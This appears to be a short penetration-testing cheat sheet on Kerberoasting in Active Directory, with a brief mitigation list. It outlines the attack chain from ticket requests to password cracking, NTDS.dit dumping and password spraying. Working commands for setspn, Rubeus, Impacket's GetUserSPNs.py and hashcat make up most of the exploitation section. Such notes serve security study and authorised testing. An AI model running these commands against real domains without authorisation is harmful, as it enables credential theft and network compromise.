# Kerberoasting

- [Kerberoasting](#kerberoasting)
  - [Overview](#overview)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)

## Overview

- Request service ticket for any service with registered SPN
- Use ticket to crack service password
- Use BloodHound to find Kerberoastable accounts
- If service is a domain admin we can gather loot and dump the NTDS.dit
- If not, you can use it to log into other systems and pivot or escalate
- Use cracked password for password spraying

## Exploitation  

```powershell
# Find all accounts with SPN
setspn -T DOMAIN -Q â€‹*/*

# Rubeus
Rubeus.exe kerberoast

# Impacket
GetUserSPNs.py controller.local/user:password -dc-ip 10.10.10.10 -request

# Crack hash with hashcat
hashcat -a 0 -m 13100 hash.txt rockyou.txt
```

## Mitigation

- Strong password policy
- Don't make service accounts domain admins